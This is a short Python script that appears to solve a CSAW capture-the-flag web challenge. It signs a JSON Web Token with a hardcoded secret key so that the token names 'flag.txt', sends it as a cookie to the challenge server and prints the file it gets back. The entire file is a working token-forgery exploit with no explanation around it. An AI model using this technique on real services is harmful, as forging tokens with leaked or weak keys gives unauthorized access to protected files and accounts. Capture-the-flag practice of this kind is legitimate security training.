import requests
import jwt

s= requests.Session()

url = "http://web.red.csaw.io:5013/"

key = "super_secret_k3y"

# token = jwt.encode({"filename": 'flag.txt'}, key, algorithm='HS256')

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaWxlbmFtZSI6ImZsYWcudHh0In0.HbdszJEzWms5E81eENfvaIore8viKKT6U-B2gB59g3o"

cookies = {'jwt': token}

request = s.get(url + "flag.txt", cookies=cookies)

print(request.text)
